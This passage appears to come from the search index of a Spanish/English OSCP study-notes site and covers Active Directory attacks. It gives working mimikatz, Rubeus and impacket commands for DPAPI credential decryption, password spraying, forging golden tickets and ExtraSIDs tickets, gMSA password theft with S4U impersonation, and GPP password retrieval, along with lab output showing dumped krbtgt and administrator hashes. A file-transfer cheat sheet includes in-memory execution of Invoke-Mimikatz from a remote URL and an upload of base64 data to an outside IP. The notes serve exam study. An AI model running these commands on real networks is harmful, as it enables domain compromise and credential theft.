/in:C:\\Users\\epugh\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1396373213-2872852198-2033860859-1151\\7dc6a492-36e2-4c2d-be66-ba29d263dda2 /rpc</code>: Obtenemos la masterkey cifrada con la contrase\u00f1a del usuario con rpc, usa el servicio lssass</li> <li><code>dpapi::cred /in:C:\\users\\epugh\\AppData\\Local\\Microsoft\\Credentials\\&lt;CRED_GUID&gt; /masterkey:&lt;MASTERKEY_HEX&gt;</code> : Obtenemos las credenciales cifradas con la masterkey</li> </ul>"},{"location":"OSCP/dpapiAttack/#referencias","title":"Referencias","text":"<ul> <li>Fortra</li> <li>Hack Tricks Wiki</li> </ul>"},{"location":"OSCP/enum/","title":"General Enumeration stuff","text":""},{"location":"OSCP/enum/#overview","title":"Overview","text":""},{"location":"OSCP/enum/#osint","title":"OSINT","text":"Resource Examples ASN / IP registrars IANA, ARIN for searching the Americas, RIPE for searching in Europe, BGP Toolkit Domain Registrars &amp; DNS Domaintools, PTRArchive, ICANN, manual DNS record requests against the domain in question or against well-known DNS servers, such as 8.8.8.8 Social Media Searching LinkedIn, Twitter, Facebook, your region's major social media sites, news articles, and any relevant info you can find about the organization Public-Facing Company Websites Often, the public website for a corporation will have relevant info embedded. News articles, embedded documents, and the \"About Us\" and \"Contact Us\" pages can also be gold mines Cloud &amp; Dev Storage Spaces GitHub, AWS S3 buckets &amp; Azure Blob storage containers, Google searches using \"Dorks\" Breach Data Sources HaveIBeenPwned to determine if any corporate email accounts appear in public breach data, Dehashed to search for corporate emails with cleartext passwords or hashes we can try to crack offline. We can then try these passwords against any exposed login portals (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, custom applications, etc.) that may use AD authentication"},{"location":"OSCP/enum/#ad-enumeration","title":"AD Enumeration","text":"<ul> <li>Kerbrute<ul> <li><code>root@kali:~# ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt</code></li> <li><code>kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users</code></li> <li><code>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt</code></li> <li><code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 users2.txt Welcome1</code></li> </ul> </li> <li>BloodHound</li> <li>AD ACL Enumeration</li> <li>CA &amp; CN Enumeration</li> <li>AD User Enumeration with lookupsid.py</li> <li>Enumerating AD DNS RECORDS TOOL<ul> <li><code>adidnsdump -u DOMAIN\\\\user ldap://DC-IP</code><ul> <li>flag <code>-r</code> resuelve registros desconocidos</li> </ul> </li> </ul> </li> <li>LDAP Enumeration</li> </ul>"},{"location":"OSCP/enum/#ad-get-installed-programs-via-powershell-registry-keys","title":"AD: Get installed programs via powershell &amp; registry keys","text":"<pre><code>PS C:\\htb&gt; $INSTALLED = Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* |  Select-Object DisplayName, DisplayVersion, InstallLocation\nPS C:\\htb&gt; $INSTALLED += Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, InstallLocation\nPS C:\\htb&gt; $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize\n</code></pre>"},{"location":"OSCP/enum/#snmp-enumeration","title":"SNMP enumeration","text":""},{"location":"OSCP/enum/#detailed-user-enumeration","title":"Detailed User Enumeration","text":"<ul> <li>LinkedIn to username</li> <li>Any script that combines the firstname and lastname<ul> <li>firstname.lastname</li> <li>firstnamelastname</li> <li>lastname.firstname</li> <li>lastnamefirstname</li> <li>lastname</li> <li>firstname</li> <li>initialFirstName.lastname</li> <li>etc</li> <li>Script One</li> <li>Script two</li> </ul> </li> </ul>"},{"location":"OSCP/enum/#cloud-services","title":"Cloud services","text":"<ul> <li>Buckets gray hat warfare</li> </ul>"},{"location":"OSCP/enum/#dns","title":"DNS","text":"<ul> <li>DNS Enumeration</li> </ul>"},{"location":"OSCP/enum/#vhost-enum","title":"vhost enum","text":"<ul> <li><code>ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://domain:port/ -H 'Host: FUZZ.domain' -fs 986</code></li> </ul>"},{"location":"OSCP/enum/#http-post-fuzzing","title":"http POST fuzzing","text":"<ul> <li><code>ffuf -w /ust/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://domain:PORT/something.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code></li> </ul>"},{"location":"OSCP/extraSidsAttack/","title":"ExtraSids Attack - Mimikatz","text":""},{"location":"OSCP/extraSidsAttack/#introduccion","title":"Introducci\u00f3n","text":"<p>El ataque ExtraSIDs permite a un atacante escalar privilegios desde un dominio hijo comprometido hacia el dominio padre dentro del mismo Active Directory (AD) Forest. Este ataque aprovecha la falta de filtrado de SIDs (SID filtering) en las relaciones de confianza entre dominios dentro de un mismo bosque, permitiendo que un usuario autenticado en el dominio hijo, con un ticket Kerberos que incluye un SID adicional (extra SID) del grupo Enterprise Admins del dominio padre, sea tratado como administrador en el dominio padre y, por ende, en todo el bosque.</p>"},{"location":"OSCP/extraSidsAttack/#explicacion-rapida","title":"Explicaci\u00f3n r\u00e1pida","text":"<ul> <li>Este ataque permite comprometer a un dominio padre desde que el dominio hijo ya fue comprometido bajo el mismo AD FOREST.</li> </ul>"},{"location":"OSCP/extraSidsAttack/#estructura-de-un-ad-forest","title":"Estructura de un AD Forest","text":"<ul> <li>Dominio Padre: Ejemplo: <code>poseidon.yzx</code></li> <li>Dominio Hijo: Ejemplo: <code>sub.poseidon.yzx</code></li> <li> <p>Relaci\u00f3n de Confianza: Existe una confianza bidireccional entre el dominio hijo y el padre, lo que permite la autenticaci\u00f3n cruzada dentro del bosque.</p> </li> <li> <p></p> </li> <li>Este ataque se basa en la explotaci\u00f3n de propiedad sidHistory y la falta de protecci\u00f3n de filtrado de SIDs (Sid filtering) entre dominios dentro de un AD FOREST.</li> <li>Para hacer este ataque se necesitan las siguientes condiciones:<ul> <li>HASH NT del KRBTGT del dominio hijo: Hay que generar un Golden Ticket.</li> <li>SID del dominio fijo.</li> <li>Nombre de un usuero objetivo en el dominio hijo.</li> <li>FQDN del dominio hijo.</li> <li>SID del grupo Enterprise Admins del dominio padre. </li> </ul> </li> <li>Debido a la ausencia de SID filtering, cuando este usuario autenticado con un SID modificado accede al dominio padre, est ratado como si fuera un miembro del grupo Admins, as\u00ed dandole privilegios sobre todo el AD FOREST.</li> </ul>"},{"location":"OSCP/extraSidsAttack/#creacion-del-golden-ticket-con-mimikatz","title":"Creaci\u00f3n del golden ticket con mimikatz","text":"<ul> <li>Golden Ticket Attack m\u00e1s info</li> <li><code>mimikatz # lsadump::dcsync /user:DOMAIN\\krbtgt</code></li> <li><code>kerberos::golden /user:hacker /domain:DOMAIN.LOCAL /sid:SID-FOR-THE-CHILD-DOMAIN /krbtgt:9d765b482771505cbe97411065964d5f /sids:ENTERPRISE-ADMIN-SID /ptt</code></li> </ul>"},{"location":"OSCP/extraSidsAttack/#obtener-sid-de-enterprise-admin","title":"Obtener SID de enterprise admin","text":"<ul> <li><code>Get-DomainGroup -Domain DOMAIN.LOCAL -Identity \"Enterprise Admins\" | select distinguishedname,objectsid</code></li> <li>Y si no tambi\u00e9n con:<ul> <li><code>Import-Module ActiveDirectory</code></li> <li><code>Get-ADGroup \"Enterprise Admins\" -Server DOMAIN.LOCAL</code></li> </ul> </li> </ul>"},{"location":"OSCP/extraSidsAttack/#mediante-linux","title":"Mediante Linux","text":""},{"location":"OSCP/extraSidsAttack/#conseguir-el-sid-con-impacket","title":"Conseguir el SID con impacket","text":"<ul> <li><code>impacket-lookupsid DOMAIN.LOCAL/USER@DC-IP</code></li> <li>Ejemplo: <code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep \"Domain SID\"</code> <ul> <li><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 \"Enterprise Admins\"</code></li> </ul> </li> </ul>"},{"location":"OSCP/extraSidsAttack/#golden-ticket-con-impacket","title":"Golden ticket con impacket","text":"<ul> <li><code>impacket-ticketer -nthash NT-HASH -domain DOMAIN.LOCAL -domain-sid DOMAIN-SID -extra-sid EXTRA-SID hacker</code></li> <li>Exportamos la variable del ticket kerberos: <code>export KRB5CCNAME=hacker.ccache</code></li> <li>Utilizamos psexec de impacket para entrar con este ticket <code>impacket-psexec DOMAIN.LOCAL/hacker@DC01.DOMAIN.LOCAL -k -no-pass -target-ip DC-IP</code></li> </ul>"},{"location":"OSCP/extraSidsAttack/#automatizar-este-proceso-con-raisechild-de-impacket","title":"Automatizar este proceso con raiseChild de impacket","text":"<ul> <li>Esta herramienta automatiza la escalaci\u00f3n de dominio hijo a padre, necesitamos especificar el dominio objetivo con su DC, y credenciales en el dominio hijo. El script har\u00e1 lo dem\u00e1s.</li> <li><code>impacket-raiseChild -target-exec DC-IP CHILD.DOMAIN.LOCAL/user</code></li> </ul>"},{"location":"OSCP/extraSidsAttack/#ejemplo","title":"Ejemplo","text":"<pre><code>\u250c\u2500[htb-student@ea-attack01]\u2500[~]\n\u2514\u2500\u2500\u257c $raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm\nImpacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation\n\nPassword:\n[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL\n[*] Forest FQDN is: INLANEFREIGHT.LOCAL\n[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL\n[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519\n[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL\nLOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::\nLOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8\n[*] Getting credentials for INLANEFREIGHT.LOCAL\nINLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::\nINLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d\n[*] Target User account name is administrator\nINLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::\nINLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6\n[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....\n[*] Found writable share ADMIN$\n[*] Uploading file KNAMkjZu.exe\n[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....\n[*] Creating service pxRD on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....\n[*] Starting service pxRD.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.107]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nnt authority\\system\n</code></pre>"},{"location":"OSCP/extraSidsAttack/#ejemplo-2","title":"Ejemplo 2","text":""},{"location":"OSCP/extraSidsAttack/#requisitos","title":"Requisitos","text":"<p>Para ejecutar el ataque ExtraSIDs, necesitas obtener los siguientes elementos:</p> <ol> <li>Clave AES256 o Hash NTLM del usuario <code>krbtgt</code> del dominio hijo </li> <li> <p>C\u00f3mo obtenerlo:  </p> <ul> <li>Usa <code>impacket-secretsdump</code> para realizar un DCSync: <pre><code>impacket-secretsdump -just-dc-user krbtgt &lt;DOMINIO_HIJO&gt;/&lt;USUARIO&gt;@&lt;IP_DC_HIJO&gt;\n</code></pre></li> <li>Extrae el archivo <code>ntds.dit</code> del controlador de dominio hijo y procesa con: <pre><code>impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL\n</code></pre></li> </ul> </li> <li> <p>SID del dominio hijo </p> </li> <li> <p>C\u00f3mo obtenerlo:  </p> <ul> <li>Usa <code>impacket-lookupsid</code>: <pre><code>impacket-lookupsid &lt;DOMINIO_HIJO&gt;/&lt;USUARIO&gt;@&lt;IP_DC_HIJO&gt; | grep \"Domain SID\"\n</code></pre></li> <li>O extrae el SID desde <code>ntds.dit</code>.</li> </ul> </li> <li> <p>Nombre del usuario objetivo en el dominio hijo </p> </li> <li> <p>Ejemplo: <code>Administrator</code>.</p> </li> <li> <p>FQDN del dominio hijo </p> </li> <li> <p>Ejemplo: <code>sub.poseidon.yzx</code>.</p> </li> <li> <p>SID del grupo Enterprise Admins del dominio padre </p> </li> <li> <p>C\u00f3mo obtenerlo:  </p> <ul> <li>Usa BloodHound o PowerShell en el dominio padre: <pre><code>Get-DomainGroup -Domain &lt;DOMINIO_PADRE&gt; -Identity \"Enterprise Admins\" | select objectsid\n</code></pre></li> <li>O con <code>impacket-lookupsid</code>: <pre><code>impacket-lookupsid &lt;DOMINIO_HIJO&gt;/&lt;USUARIO&gt;@&lt;IP_DC_PADRE&gt; | grep -B12 \"Enterprise Admins\"\n</code></pre></li> </ul> </li> <li> <p>IP o nombre del controlador de dominio del dominio padre </p> </li> <li>Ejemplo: <code>dc01.poseidon.yzx</code> o <code>192.168.1.10</code>.</li> </ol>"},{"location":"OSCP/extraSidsAttack/#ejecucion-del-ataque-con-impacket-ticketer","title":"Ejecuci\u00f3n del Ataque con <code>impacket-ticketer</code>","text":""},{"location":"OSCP/extraSidsAttack/#paso-1-forjar-el-golden-ticket","title":"Paso 1: Forjar el Golden Ticket","text":"<p>Usa <code>impacket-ticketer</code> para crear un ticket Kerberos en el dominio hijo que incluya un extra SID del dominio padre:</p> <pre><code>impacket-ticketer \\\n  -aesKey &lt;CLAVE_AES256_KRBTGT&gt; \\\n  -domain-sid &lt;SID_DOMINIO_HIJO&gt; \\\n  -domain &lt;FQDN_DOMINIO_HIJO&gt; \\\n  -user &lt;NOMBRE_USUARIO&gt; \\\n  -user-id &lt;RID_USUARIO&gt; \\\n  -groups &lt;LISTA_GRUPOS&gt; \\\n  -extra-sid &lt;SID_ENTERPRISE_ADMINS&gt; \\\n  -extra-pac \\\n  &lt;NOMBRE_TICKET&gt;.ccache\n</code></pre>"},{"location":"OSCP/extraSidsAttack/#parametros-explicados","title":"Par\u00e1metros Explicados:","text":"<ul> <li><code>-aesKey</code>: Clave AES256 del <code>krbtgt</code> del dominio hijo (alternativamente, usa <code>-nthash</code> para el hash NTLM).  </li> <li><code>-domain-sid</code>: SID del dominio hijo (ejemplo: <code>S-1-5-21-4168247447-1722543658-2110108262</code>).  </li> <li><code>-domain</code>: Nombre completo del dominio hijo (ejemplo: <code>sub.poseidon.yzx</code>).  </li> <li><code>-user</code>: Nombre del usuario objetivo (ejemplo: <code>Administrator</code>).  </li> <li><code>-user-id</code>: RID del usuario (ejemplo: <code>500</code> para Administrator).  </li> <li><code>-groups</code>: Lista de RIDs de grupos a los que pertenece el usuario (ejemplo: <code>512,513,518,519,520</code> para Domain Admins, Domain Users, Schema Admins, Enterprise Admins, Group Policy Creator Owners).  </li> <li><code>-extra-sid</code>: SID del grupo Enterprise Admins del dominio padre (ejemplo: <code>S-1-5-21-1190331060-1711709193-932631991-519</code>).  </li> <li><code>-extra-pac</code>: Asegura que el PAC incluya el extra SID.  </li> <li><code>&lt;NOMBRE_TICKET&gt;.ccache</code>: Nombre del archivo de ticket generado (ejemplo: <code>administrator.ccache</code>).</li> </ul>"},{"location":"OSCP/extraSidsAttack/#ejemplo-generalizado","title":"Ejemplo Generalizado:","text":"<pre><code>impacket-ticketer \\\n  -aesKey &lt;CLAVE_AES256_KRBTGT&gt; \\\n  -domain-sid S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx \\\n  -domain &lt;DOMINIO_HIJO&gt; \\\n  -user Administrator \\\n  -user-id 500 \\\n  -groups 512,513,518,519,520 \\\n  -extra-sid S-1-5-21-yyyyyyyyyy-yyyyyyyyyy-yyyyyyyyyy-519 \\\n  -extra-pac \\\n  ticket.ccache\n</code></pre>"},{"location":"OSCP/extraSidsAttack/#paso-2-configurar-el-ticket","title":"Paso 2: Configurar el Ticket","text":"<p>Configura el ticket como la credencial Kerberos activa en tu entorno:</p> <pre><code>export KRB5CCNAME=$(pwd)/&lt;NOMBRE_TICKET&gt;.ccache\n</code></pre>"},{"location":"OSCP/extraSidsAttack/#paso-3-acceder-al-dominio-padre","title":"Paso 3: Acceder al Dominio Padre","text":"<p>Usa herramientas de Impacket como <code>impacket-psexec</code> para autenticarte en el controlador de dominio del dominio padre:</p> <pre><code>impacket-psexec -k -no-pass &lt;DOMINIO_HIJO&gt;/&lt;NOMBRE_USUARIO&gt;@&lt;IP_DC_PADRE&gt;\n</code></pre> <ul> <li><code>-k</code>: Usa autenticaci\u00f3n Kerberos con el ticket generado.  </li> <li><code>-no-pass</code>: No requiere contrase\u00f1a adicional.  </li> </ul>"},{"location":"OSCP/fileTransfer/","title":"File transfer Cheat Sheet","text":"<p>The cheat sheet is a useful command reference for this module.</p> Command Description <code>Invoke-WebRequest https://&lt;snip&gt;/PowerView.ps1 -OutFile PowerView.ps1</code> Download a file with PowerShell <code>IEX (New-Object Net.WebClient).DownloadString('https://&lt;snip&gt;/Invoke-Mimikatz.ps1')</code> Execute a file in memory using PowerShell <code>Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64</code> Upload a file with PowerShell <code>bitsadmin /transfer n http://10.10.10.32/nc.exe C:\\Temp\\nc.exe</code> Download a file using Bitsadmin <code>certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe</code> Download a file using Certutil <code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</code> Download a file using Wget <code>curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code> Download a file using cURL <code>php -r '$file = file_get_contents(\"https://&lt;snip&gt;/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'</code> Download a file using PHP <code>scp C:\\Temp\\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip</code> Upload a file using SCP <code>scp user@target:/tmp/mimikatz.exe C:\\Temp\\mimikatz.exe</code> Download a file using SCP <code>Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile \"nc.exe\"</code> Invoke-WebRequest using a Chrome User Agent"},{"location":"OSCP/gmsaAbusing/","title":"GMSA abusing and s4u delegation attack [ReadGMSAPassword] + [AllowedToDelegate]","text":""},{"location":"OSCP/gmsaAbusing/#descripcion-del-ataque","title":"Descripci\u00f3n del ataque","text":"<p>Este ataque aprovecha dos permisos clave para comprometer un entorno de Active Directory mediante una cuenta de servicio administrada de grupo (gMSA):</p> <ol> <li> <p>ReadGMSAPassword: Este permiso permite leer la contrase\u00f1a Kerberos asociada a la cuenta gMSA. Utilizando herramientas como <code>gMSADumper.py</code>, se extrae el hash NTLM de la cuenta de servicio, lo que proporciona acceso inicial para realizar operaciones en su contexto.</p> </li> <li> <p>AllowedToDelegate: Este permiso habilita la delegaci\u00f3n de credenciales, lo que permite a la cuenta gMSA actuar en nombre de otros usuarios. Combinando los ataques S4U2Self y S4U2Proxy, es posible generar un Ticket de Servicio (ST) para un SPN arbitrario (por ejemplo, <code>cifs/dc.intelligence.htb</code>) e impersonar a un usuario privilegiado como <code>Administrator</code>.</p> </li> </ol> <p>El resultado final es el acceso a recursos protegidos o sistemas cr\u00edticos, explotando la configuraci\u00f3n indebida de permisos en la cuenta gMSA.</p>"},{"location":"OSCP/gmsaAbusing/#objetivo-y-ejemplo-de-uso-en-un-ctf","title":"Objetivo y ejemplo de uso en un CTF","text":"<ul> <li>El objetivo es obtener un Ticket de Servicio (ST) para un SPN arbitrario (como <code>cifs/dc.intelligence.htb</code>) impersonando a un usuario privilegiado, aprovechando que la cuenta <code>svc_int$</code> tiene permiso para delegar.</li> </ul>"},{"location":"OSCP/gmsaAbusing/#herramientas-utilizadas","title":"Herramientas utilizadas","text":"<ul> <li><code>gMSADumper</code></li> <li><code>Impacket</code><ul> <li><code>getTGT.py</code></li> <li><code>getST.py</code></li> </ul> </li> <li><code>ntpdate</code></li> <li><code>nxc</code></li> </ul>"},{"location":"OSCP/gmsaAbusing/#pasos-del-ataque","title":"Pasos del ataque","text":"<ol> <li> <p>Ejecutar <code>gMSADumper.py</code> para extraer el hash NTLM de la cuenta <code>svc_int$</code>:      <pre><code>python3 gMSADumper.py -u 'TED.GRAVES' -p 'Mr.Teddy' -d 'intelligence.htb'\n</code></pre>      Resultado:      <pre><code>svc_int$:::b05dfb2636385604c6d36b0ca61e35cb\n</code></pre></p> </li> <li> <p>Utilizar <code>getTGT.py</code> para obtener un TGT usando el hash NTLM de <code>svc_int$</code>:      <pre><code>getTGT.py 'INTELLIGENCE.HTB/svc_int$' -hashes :b05dfb2636385604c6d36b0ca61e35cb\nexport KRB5CCNAME=/home/kali/svc_int$.ccache\n</code></pre></p> </li> <li> <p>Impersonar al usuario <code>Administrator</code> con <code>getST.py</code>:      <pre><code>getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes :b05dfb2636385604c6d36b0ca61e35cb\n</code></pre>      Resultado:      <pre><code>[*] Requesting S4U2Proxy\n[*] Saving ticket in Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache\n</code></pre></p> </li> <li> <p>Exportar el nuevo ticket:      <pre><code>export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache\n</code></pre></p> </li> <li> <p>Conectarse al sistema objetivo con <code>psexec.py</code>:      <pre><code>psexec.py -k -no-pass INTELLIGENCE.HTB/Administrator@dc.intelligence.htb\n</code></pre></p> <p>Ejemplo de salida:  <pre><code>Microsoft Windows [Version 10.0.17763.1879]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt; type c:\\Users\\Administrator\\Desktop\\root.txt\n1375c5a7e7b13d7d9e063dd4629cb806\n</code></pre></p> </li> </ol>"},{"location":"OSCP/gmsaAbusing/#version-en-powershell","title":"Versi\u00f3n en powershell","text":"<ul> <li>Script</li> <li><code>. .\\Invoke-GMSAPasswordReader.ps1</code></li> <li>Invoke-GMSAPasswordReader -Command \"--AccountName USERNAME\"</li> </ul> <p><pre><code>Calculating hashes for Old Value\n[*] Input username             : svc_apache$\n[*] Input domain               : HEIST.OFFSEC\n[*] Salt                       : HEIST.OFFSECsvc_apache$\n[*]       rc4_hmac             : &lt;OLD_RC4_HASH&gt;\n[*]       aes128_cts_hmac_sha1 : &lt;OLD_AES128_HASH&gt;\n[*]       aes256_cts_hmac_sha1 : &lt;OLD_AES256_HASH&gt;\n[*]       des_cbc_md5          : &lt;OLD_DES_HASH&gt;\n\nCalculating hashes for Current Value\n[*] Input username             : svc_apache$\n[*] Input domain               : HEIST.OFFSEC\n[*] Salt                       : HEIST.OFFSECsvc_apache$\n[*]       rc4_hmac             : &lt;CURRENT_RC4_HASH&gt;\n[*]       aes128_cts_hmac_sha1 : &lt;CURRENT_AES128_HASH&gt;\n[*]       aes256_cts_hmac_sha1 : &lt;CURRENT_AES256_HASH&gt;\n[*]       des_cbc_md5          : &lt;CURRENT_DES_HASH&gt;\n</code></pre> - siendo <code>&lt;CURRENT_RC4_HASH&gt;</code> el NT hash de la cuenta</p>"},{"location":"OSCP/gmsaAbusing/#referencias","title":"Referencias","text":""},{"location":"OSCP/gmsaAbusing/#readgmsapassword","title":"ReadGMSAPassword","text":"<ul> <li>Retrieving Cleartext gMSA Passwords from Active Directory</li> <li>DSInternals PowerShell Module</li> <li>PSgMSAPwd</li> <li>Active Directory Security - gMSA</li> <li>Active Directory Security - Delegation Abuse</li> <li>Event ID 4662</li> <li>The Hacker Recipes - ReadGMSAPassword</li> </ul>"},{"location":"OSCP/gmsaAbusing/#allowedtodelegate","title":"AllowedToDelegate","text":"<ul> <li>S4U - Rubeus</li> <li>Trust: Years to Earn, Seconds to Break</li> <li>S4U2Pwnage</li> <li>Gentil Kiwi - S4U Tweet</li> <li>Kerberos Delegation, SPNs, and More</li> <li>From Kekeo to Rubeus</li> <li>Another Word on Delegation</li> <li>The Hacker Recipes - Delegations</li> </ul>"},{"location":"OSCP/goldenTicketAttack/","title":"Golden Ticket Attack","text":"<ul> <li>Cuando comprometemos la cuenta krbtgt, ya owneamos el dominio.</li> <li>Podemos solicitar acceso a cualquier recurso o sistema dentro del dominio.</li> <li>Golden tickets == Completar acceso a cualquier maquina.</li> </ul>"},{"location":"OSCP/goldenTicketAttack/#mimikatz","title":"Mimikatz","text":"<ul> <li><code>privilege::debug</code></li> <li><code>lsadump::lsa /inject /name:krbtgt</code></li> <li>Ahora generamos el golden ticket:<ul> <li><code>kerberos::golden /User:Administrator /domain:DOMAIN.local /sid:SID /krbtgt:NTLM /id:500 /ptt</code></li> <li>el <code>/id:500</code> significa el RID de administrador de maximos privilegios.</li> </ul> </li> <li><code>misc::cmd</code> para abrir un command prompt privilegiado</li> </ul>"},{"location":"OSCP/goldenTicketAttack/#ejemplo-mimikatz","title":"Ejemplo mimikatz","text":"<pre><code>kerberos::golden /user:administrator /domain:painters.htb /sid:S-1-5-21-1470357062-2280927533-300823338 /krbtgt:4b6af2bf64714682eeef64f516a08949 /sids:S-1-5-21-2734290894-461713716-141835440-4601 /ptt\nmimikatz # User      : administrator\nDomain    : painters.htb (PAINTERS)\nSID       : S-1-5-21-1470357062-2280927533-300823338\nUser Id   : 500\nGroups Id : *513 512 520 518 519 \nExtra SIDs: S-1-5-21-2734290894-461713716-141835440-4601 ; \nServiceKey: 4b6af2bf64714682eeef64f516a08949 - rc4_hmac_nt      \nLifetime  : 06/03/2025 13:59:25 ; 04/03/2035 13:59:25 ; 04/03/2035 13:59:25\n-&gt; Ticket : ** Pass The Ticket **\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\nGolden ticket for 'administrator @ painters.htb' successfully submitted for current session\n</code></pre>"},{"location":"OSCP/goldenTicketAttack/#rubeus","title":"Rubeus","text":"<ul> <li><code>.\\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt</code></li> </ul>"},{"location":"OSCP/goldenTicketAttack/#golden-ticket-con-impacket","title":"Golden ticket con impacket","text":"<ul> <li><code>impacket-ticketer -nthash NT-HASH -domain DOMAIN.LOCAL -domain-sid DOMAIN-SID -extra-sid EXTRA-SID hacker</code></li> <li>Exportamos la variable del ticket kerberos: <code>export KRB5CCNAME=hacker.ccache</code></li> <li>Utilizamos psexec de impacket para entrar con este ticket <code>impacket-psexec DOMAIN.LOCAL/hacker@DC01.DOMAIN.LOCAL -k -no-pass -target-ip DC-IP</code></li> </ul>"},{"location":"OSCP/goldenTicketAttack/#ejemplo","title":"Ejemplo:","text":"<ul> <li><code>impacket-ticketer -nthash 4b6af2bf64714682eeef64f516a08949 -domain-sid S-1-5-21-1470357062-2280927533-300823338 -domain PAINTERS.HTB administrator</code></li> <li><code>ls administrator.ccache</code></li> <li><code>export KRB5CCNAME=administrator.ccache</code></li> </ul> <pre><code>\u2514\u2500$ klist                         \nTicket cache: FILE:administrator.ccache\nDefault principal: administrator@PAINTERS.HTB\n\nValid starting       Expires              Service principal\n03/06/2025 09:34:13  03/04/2035 09:34:13  krbtgt/PAINTERS.HTB@PAINTERS.HTB\n    renew until 03/04/2035 09:34:13\n</code></pre> <ul> <li><code>sudo mousepad /etc/resolv.conf</code> y agregamos <code>nameserver IP-DC</code> para resolver el nombre del DC.</li> </ul>"},{"location":"OSCP/gpp/","title":"Group Policy Preferences (GPP) Passwords","text":"<ul> <li>Se puede explotar la forma en que se almacenan y gestionan algunas configs de group policy.</li> <li>Cuando se crea una nueva policy se genera un .xml en un share SYSVOL del DC.</li> <li>Estos xml pueden tener diversas configs hasta contrase\u00f1as.</li> <li>Suelen tener cierta protecci\u00f3n con criptograf\u00eda.</li> </ul>"},{"location":"OSCP/gpp/#atacar","title":"Atacar","text":"<ul> <li><code>smbclient //DOMAIN/SYSVOL -U USER</code><ul> <li><code>/Policies/{PolicyGUID}/Machine/Preferences/Groups/</code></li> <li>Archivos como: Groups.xml, Drives.xml, ScheduledTasks.xml</li> </ul> </li> <li>Para desencriptar hay que usar gpp decrypt</li> </ul>"},{"location":"OSCP/gpp/#ejemplo-smb-map","title":"Ejemplo SMB MAP","text":"<ul> <li><code>smbmap -H IP -u USER -p PASS</code></li> <li><code>smbmap -H IP -u USER -p PASS -r SYSVOL</code></li> <li>Para descargar: <code>smbmap -H IP -u USER -p PASS --download SYSVOL/path/to/groups.xml</code></li> </ul>"},{"location":"OSCP/gpp/#locating-retrieving-gpp-passwords-with-crackmapexec","title":"Locating &amp; Retrieving GPP Passwords with CrackMapExec","text":"<pre><code>GNT@htb[/htb]$ crackmapexec smb -L | grep gpp\n\n[*] 